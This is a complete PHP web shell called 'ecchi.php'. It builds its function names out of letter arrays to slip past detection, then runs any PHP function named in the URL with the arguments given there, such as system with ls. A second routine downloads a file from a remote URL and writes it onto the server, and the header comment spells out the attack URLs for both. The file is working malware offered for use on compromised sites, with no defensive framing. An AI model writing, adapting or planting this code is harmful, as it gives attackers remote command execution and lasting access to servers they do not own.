<?php
error_reporting(0);

/*
    Usage : http://target.com/ecchi.php?a=system&ecchi[]=ls
    Create File : http://target.com/ecchi.php?a=sum&ecchi[]=(url file ex: http://exp.com/as.txt)&ecchi[]=(name file ex: as.php)
*/

$upp  = range('A', 'Z');
$low  = range('a', 'z');

function sum($u, $nm)
{
    global $low;

    $cwd    = $low[6] . $low[4] . $low[19] . $low[2] . $low[22] . $low[3];
    $u      = file_get_contents($u);
    $fp     = fopen($nm, "w");

    if (fwrite($fp, $u)) {
        echo "Success create file <b>$nm</b> in <i>" . $cwd() . "</i>";
    } else {
        echo "Failed";
    }

    fclose($fp);
}

$in   = $low[8] . $low[13] . $low[8];
$et   = $low[6] . $low[4] . $low[19];
$init = $in . '_' . $et; // ini_get

$p   = $low[4] . $low[2] . $low[2] . $low[7] . $low[8]; // ecchi
$g   = "_" . $upp[6] . $upp[4] . $upp[19]; // _GET
$g   = $$g; // $_GET

$exp = explode(",", $init('disable_functions'));
$dis = $init('disable_functions') == null ? 'Nothing' : $init('disable_functions');

if (!isset($g[$low[0]])) {
    echo "Function Disable : " . $dis;
} else {
    if (in_array($g[$low[0]], $exp)) {
        echo "Function Is Disable";
    } else {
        call_user_func_array($g[$low[0]], $g[$p]);
    }
}
